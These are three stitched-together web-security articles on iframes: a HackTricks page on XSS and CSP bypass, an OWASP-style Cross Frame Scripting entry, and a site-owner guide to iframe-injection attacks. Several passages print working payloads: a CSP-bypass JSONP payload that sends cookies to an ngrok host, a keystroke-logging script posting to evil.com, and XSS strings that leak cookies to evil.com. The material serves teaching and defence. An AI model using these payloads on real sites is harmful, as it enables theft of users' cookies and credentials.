# Iframes in XSS, CSP and SOP

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

## Iframes in XSS

There are 3 ways to indicate the content of an iframed page:

* Via `src` indicating an URL (the URL may be cross origin or same origin)
* Via `src` indicating the content using the `data:` protocol
* Via `srcdoc` indicating the content

**Accesing Parent & Child vars**

```html
<html>
  <script>
  var secret = "31337s3cr37t";
  </script>

  <iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if2" src="child.html"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

  <script>
  function access_children_vars(){
    alert(if1.secret);
    alert(if2.secret);
    alert(if3.secret);
    alert(if4.secret);
  }
  setTimeout(access_children_vars, 3000);
  </script>
</html>
```

```html
<!-- content of child.html -->
<script>
var secret="child secret";
alert(parent.secret)
</script>
```

If you access the previous html via a http server (like `python3 -m http.server`) you will notice that all the scripts will be executed (as there is no CSP preventing it)., **the parent won’t be able to access the `secret` var inside any iframe** and **only the iframes if2 & if3 (which are considered to be same-site) can access the secret** in the original window.\
Note how if4 is considered to have `null` origin.

### Iframes with CSP <a href="#iframes_with_csp_40" id="iframes_with_csp_40"></a>

{% hint style="info" %}
Please, note how in the following bypasses the response to the iframed page doesn't contain any CSP header that prevents JS execution.
{% endhint %}

The `self` value of `script-src` won’t allow the execution of the JS code using the `data:` protocol or the `srcdoc` attribute.\
However, even the `none` value of the CSP will allow the execution of the iframes that put a URL (complete or just the path) in the `src` attribute.\
Therefore it’s possible to bypass the CSP of a page with:

```html
<html>
<head>
 <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='">
</head>
  <script>
  var secret = "31337s3cr37t";
  </script>
  <iframe id="if1" src="child.html"></iframe>
  <iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>
```

Note how the **previous CSP only permits the execution of the inline script**.\
However, **only `if1` and `if2` scripts are going to be executed but only `if1` will be able to access the parent secret**.

![](<../../.gitbook/assets/image (627) (1) (1).png>)

Therefore, it’s possible to **bypass a CSP if you can upload a JS file to the server and load it via iframe even with `script-src 'none'`**. This can **potentially be also done abusing a same-site JSONP endpoint**.

You can test this with the following scenario were a cookie is stolen even with `script-src 'none'`. Just run the application and access it with your browser:

```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
    resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
    resp.headers['Content-Security-Policy'] = "script-src 'self'"
    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
    return resp

@app.route("/cookie_s.html")
def cookie_s():
    return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
    app.run()
```

### Other Payloads found on the wild <a href="#other_payloads_found_on_the_wild_64" id="other_payloads_found_on_the_wild_64"></a>

```html
<!-- This one requires the data: scheme to be allowed -->
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```

### Iframe sandbox

The `sandbox` attribute enables an extra set of restrictions for the content in the iframe. **By default, no restriction is applied.**

When the `sandbox` attribute is present, and it will:

* treat the content as being from a unique origin
* block form submission
* block script execution
* disable APIs
* prevent links from targeting other browsing contexts
* prevent content from using plugins (through `<embed>`, `<object>`, `<applet>`, or other)
* prevent the content to navigate its top-level browsing context
* block automatically triggered features (such as automatically playing a video or automatically focusing a form control)

The value of the `sandbox` attribute can either be empty (then all restrictions are applied), or a space-separated list of pre-defined values that will REMOVE the particular restrictions.

```html
<iframe src="demo_iframe_sandbox.htm" sandbox></iframe>
```

## Iframes in SOP

Check the following pages:

{% content-ref url="../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>


---

layout: col-sidebar
title: Cross Frame Scripting
author: Rezos, Justin Ludwig
contributors: KristenS, Michael Brooks, Andrew Smith, kingthorin
permalink: /attacks/Cross_Frame_Scripting
tags: attack, Cross Frame Scripting

---

{% include writers.html %}

## Description

Cross-Frame Scripting (XFS) is an attack that combines malicious
JavaScript with an iframe that loads a legitimate page in an effort to
steal data from an unsuspecting user. This attack is usually only
successful when combined with social engineering. An example would
consist of an attacker convincing the user to navigate to a web page the
attacker controls. The attacker's page then loads malicious JavaScript
and an HTML iframe pointing to a legitimate site. Once the user enters
credentials into the legitimate site within the iframe, the malicious
JavaScript steals the keystrokes.

## Risk Factors

The standard browser security model allows JavaScript from one web page
to access the content of other pages that have been loaded in different
browser windows or frames as long as those other pages have been loaded
from the same-origin server or domain. It does not allow access to pages
that have been loaded from different servers or domains (see MSDN
article [About Cross-Frame Scripting and
Security](http://msdn.microsoft.com/en-us/library/ms533028%28VS.85%29.aspx)).
However, specific bugs in this security model exist in specific
browsers, allowing an attacker to access some data in pages loaded from
different servers or domains. The most well-known such bug affects IE,
which leaks keyboard events across HTML framesets (see iDefense Labs
advisory [Microsoft Internet Explorer Cross Frame Scripting Restriction
Bypass](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=77)).
This bug could allow, for example, an attacker to steal the login
credentials of a browser user as they try to type them into the
login form of a third-party web page.

## Examples

### XFS Attack Against IE

To exploit the IE bug which leaks keyboard events across framesets, an
attacker may create a web page at evil.com, which the attacker controls,
and include on the evil.com page a visible frame displaying the login
page for example.com. The attacker can hide the frame's borders and
expand the frame to cover the entire page, so that it looks to the
browser user like they are actually visiting example.com The
attacker registers some JavaScript in the main evil.com page which
listens for all key events on the page. Normally, this listener would be
notified of events only from the main evil.com page -- but because of
the browser bug, this listener is notified also of events from the
framed example.com page. So every key press the browser user makes in
the example.com frame, while trying to log into example.com, can be
captured by the attacker, and reported back to evil.com:

```html
<!-- http://evil.com/example.com-login.html -->
<head>
<script>
// array of user keystrokes
var keystrokes = [];
// event listener which captures user keystrokes
document.onkeypress = function() {
    keystrokes.push(window.event.keyCode);
}
// function which reports keytrokes back to evil.com every second
setInterval(function() {
    if (keystrokes.length) {
        var xhr = newXHR();
        xhr.open("POST", "http://evil.com/k");
        xhr.send(keystrokes.join("+"));
    }
    keystrokes = [];
}, 1000);
// function which creates an ajax request object
function newXHR() {
    if (window.XMLHttpRequest)
        return new XMLHttpRequest();
    return new ActiveXObject("MSXML2.XMLHTTP.3.0");
}
</script>
</head>
<!-- re-focusing to this frameset tricks browser into leaking events -->
<frameset onload="this.focus()" onblur="this.focus()">
<!-- frame which embeds example.com login page -->
<frame src="http://example.com/login.html">
</frameset>
```

### XSS Attack Using Frames

To exploit a [Cross Site Scripting]({{ site.baseurl }}/attacks/xss/) on a third-party web page at
example.com, the attacker could create a web page at evil.com, which the
attacker controls, and include a hidden iframe in the evil.com page. The
iframe loads the flawed example.com page, and injects some script into
it through the XSS flaw. In this example, the example.com page prints
the value of the "q" query parameter from the page's URL in the page's
content without escaping the value. This allows the attacker to inject
some JavaScript into the example.com page which steals the
browser-user's example.com cookie, and sends the cookie via a fake-image
request to evil.com (the iframe's src URL is wrapped for legibility):

```html
<iframe style="position:absolute;top:-9999px" src="http://example.com/↵
    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
    ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>
```

The iframe is hidden off-screen, so the browser user won't have any idea
that they just "visited" the example.com page. However, this attack
is effectively the same as a conventional XSS attack, since the attacker
could have simply redirected the user directly to the example.com page,
using a variety of methods, including a meta element like this (again,
the meta element's URL is wrapped for legibility):

```html
<meta http-eqiv="refresh" content="1;url=http://example.com/↵
    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
    ?c='+encodeURIComponent(document.cookie)+'\">')</script>">
```

The only difference is that when using an iframe, the attacker can hide
the frame off-screen -- so the browser user won't have any idea that they
just "visited" example.com. When using a redirect to navigate
directly to example.com, the browser will display the example.com url in
the browser's address bar, and the example.com page in the browser's
window, so the browser user will be aware that they are visiting
example.com.

### Another XSS Attack Using Frames

To exploit the same [Cross Site Scripting]({{ site.baseurl }}/attacks/xss/) as above at example.com
(which prints the value of the "q" query parameter from the page's URL
in the page's content without escaping the value) the attacker could
create a web page at evil.com, which the attacker controls, that
includes a link like the following, and induce the user to click on the
link. This link injects an iframe into the example.com page by
exploiting the XSS flaw with the "q" query parameter; the iframe runs
some JavaScript to steal the browser-user's example.com cookie, and
sends it via a fake-image request to evil.com (the URL is wrapped for
legibility):

```html
http://example.com/flawed-page.html?=<iframe src="↵
    javascript:document.body.innerHTML=+'<img src=\"http://evil.com/↵
    ?c='+encodeURIComponent(document.cookie)+'\">'"></iframe>
```

Again, this attack is effectively the same as a conventional XSS attack;
the attacker simply uses the src attribute of the injected iframe
element as a vehicle to run some javascript code in the attacked page.

## Related Threat Agents

- An XFS attack exploiting a browser bug which leaks events across
frames is similar to an attack which uses conventional key-logging
software.

## Related Attacks

- An attacker might use a hidden frame to carry out a [Cross-site Scripting (XSS)](xss) attack.
- An attacker might use a hidden frame to carry out a [Cross-Site Request Forgery (CSRF)]({{ site.baseurl }}/attacks/csrf) attack.
- An attacker might use a visible frame to carry out a [Clickjacking](Clickjacking) attack.
- An XFS attack exploiting a browser bug which leaks events across frames is a form of a Phishing attack (the
attacker lures the user into typing-in sensitive information into a frame containing a legitimate third-party page).

## Related Vulnerabilities

- XFS attacks exploit specific browser bugs.

## Related Controls

- XFS attacks may denied by preventing the third-party web page from
being framed; the techniques used to do this are the same as those
used for Clickjacking Protection.

## References

- MSDN article [About Cross-Frame Scripting and Security](http://msdn.microsoft.com/en-us/library/ms533028%28VS.85%29.aspx)
- iDefense Labs advisory [Microsoft Internet Explorer Cross Frame Scripting Restriction Bypass](http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=77)


Iframe Hacking
What is IFrame Hacking?

The name Iframe Hacking has been derived from the manner in which the hacking is done using an iframe tag. Iframe is short for inline frame, and is essentially the name of an html tag -<iframe> </iframe>. Iframe tags can be used to insert contents from another website within a web page as if they were part of the current page. While this may be useful for building user-friendly web applications and for cross-site scripting purposes, hackers misuse this feature to insert contents from their own malicious website.

In an IFrame attack, the hacker embeds a malicious iframe code snippet in your website page. When anyone visits that page, the hidden iframe code secretly downloads and installs a Trojan or a malware such as key-logger on the unsuspecting user's computer, if his computer is not adequately protected. Thus over a short period of time several of your site visitors' computers would get infected. Very soon your website will get known as a source of virus and may get blacklisted from the internet community. Even search engines will ban your website, causing severe damage to your reputation and business.

Below is an example of a hidden iframe code embed in a web page:
<iframe src="http://hackersite.com/attackfile.php" width=100% height=0></iframe>

Gumblar attack is an example of this type of iframe hacking.

Some iframe hackers may not cause real damage to your website or site visitors but may simply embed an iframe code to display an Ad, taking advantage of your website traffic, or may simply direct your site visitors to his own site with the objective to increase his own site's traffic with an aim to improve his own site's search engine rank. Some SEO experts may adopt this unscrupulous technique to drive traffic to their own client's websites to build traffic for their clients.

Below is an example of a visible iframe code embed that may be used to display an Ad:
<iframe src="http://hackersite.com/ad.jpg" width=200 height=150></iframe>

How do Hackers gain access to your website?

If your website is hacked it does not mean your hosting server is lacking on the security side. Most iframe hacking happens on websites whose owners are accessing their hosting account from an insecure computer. If your computer is infected with a key-logger malware, the moment you login to your website hosting account, the malware secretly passes your account login credentials to the hacker. The hacker then logs into your hosting account as a legitimate user and modifies your website html pages to embed the malicious iframe code.

Iframe code injection can also take place in a code driven website that may be using PHP/ASP for handling forms. If the handler codes are not securely designed it may allow for code injection via SQL injection. Read more about SQL injection.

How to protect your website from iframe hacking?

FTP Account: If you use FTP, you are in danger of exposing your passwords to hackers because the passwords are passed between your FTP client and your website in plain text. Use a program like WinSCP, or an FTP client that allows you to connect to your site using secure SFTP or SCP. Both of these methods encrypt your user name and password, making it much more difficult for a hacker to discover them, even if they intercept them with some sort of packet sniffer.

Hosting Control Panel: Whenever you log into your hosting control panel always use a secure SSL port to login. Keep your passwords difficult to guess. Use a password generator to generate your passwords. Never use the same password to log into different sites or control panels. Change your passwords more frequently.

Infected Computer: If you personal computer system is infected with Virus/Trojan/Spyware then there is a chance that the hacker gained access to your login credentials when you logged into your website hosting account. It is advisable to install a good anti-virus software on your computer and keep it always updated.

XSS (Cross Site Scripting) vulnerability in your website: If your site has XSS vulnerability then there is a high risk for such type of hacking.

SQL Injection: If your site is not designed to prevent SQL injection then hacker can easily get to access your database and insert malicious code.

What to do if your website has been attacked with iframe hacking?

    Immediately gain access to a secure computer and login to your hosting account control panel from there. Change your hosting control panel password as well as all your ftp passwords.
    Download your entire website files in the local computer. Open each and every web page file in a text editor (image files are not affected) and check for presence of any code snippet that should not have been there, and remove it. Only scanning for presence of <iframe> tag will not help, as some hackers resort to code obfuscation and embed obfuscated code.
    After you have ensured that all your website files are now clean, delete all files on the server and upload the cleaned files from your local computer.
    Also, inform your hosting provider that your website was iframe hacked so that they can do necessary checks from their end too.
    Clean the infected computer that you had been using earlier to access your hosting account. It would be better to re-format the entire hard disk and then install a good anti-virus software, so that you are protected in future.
    Never login to your hosting account from an untrusted computer.

